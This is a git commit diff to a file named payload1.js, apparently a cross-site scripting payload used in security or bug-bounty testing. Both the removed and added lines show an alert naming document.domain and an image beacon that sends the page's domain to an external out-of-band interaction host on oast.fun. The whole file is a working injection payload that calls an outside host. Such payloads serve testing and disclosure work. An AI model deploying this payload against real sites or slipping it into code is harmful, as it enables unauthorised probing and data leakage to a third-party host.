edb4ac565beba19e488c9718a65a6fd30d49591b
siddhu-1005 <84862560+siddhu-1005@users.noreply.github.com>
2025-07-25 22:33:02 +0530

    payload1.js

--- payload1.js
+++ payload1.js
@@ -1,2 +1,3 @@
-alert("✅ XSS Confirmed: " + document.domain);
-new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?x=" + document.domain;
+new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/confirm?" + document.domain;
+
+alert("XSS triggered from: " + document.domain);
